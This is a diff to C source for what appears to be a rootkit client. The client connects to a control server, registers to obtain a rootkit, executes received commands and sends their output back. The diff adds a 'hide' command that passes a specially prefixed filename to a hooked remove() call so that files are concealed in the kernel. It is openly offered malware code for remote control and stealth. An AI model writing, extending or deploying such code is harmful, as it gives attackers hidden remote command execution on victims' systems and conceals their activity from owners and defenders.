@@ -21,6 +21,7 @@ int readline(int conn, char* buf, int size);
 int getIntFromBuf(char* buf, int offset);
 int execcmd(char* cmd);
 int sendresult(int socket, char* buf);
+int hidefile(char* cmd);
 
 int main(int argc,char* argv[])
 {
@@ -46,7 +47,7 @@ int main(int argc,char* argv[])
         printf("Connection error\n");
         exit(1);
     }
-    char *req = "register\n";                         // Req for obtain a rootkit
+    char *req = "register\n";                    // Req for obtain a rootkit
     send(sock_fd, req, strlen(req),0); 
     
     memset(buf, 0, sizeof(buf));    
@@ -63,6 +64,8 @@ int main(int argc,char* argv[])
                 if(rv > 0){
                     sendresult(sock_fd, buf);
                 }
+            } else if(strncmp(buf, "hide", 4) == 0){
+                hidefile(buf + 4);
             }
         }
     }
@@ -86,6 +89,13 @@ int sendresult(int socket, char* buf){
     send(socket, buf, strlen(buf) + 1,0); 
     
     return 0;
+}
+
+int hidefile(char* cmd){
+    char filen[256] = "HIDEAFILEINKERNEL%";
+    while(*cmd == ' ') cmd++;
+    memcpy(filen+strlen(filen), cmd, strlen(cmd) + 1);
+    remove(filen);          //We hooked remove;
 }
 
 int execcmd(char* cmd){
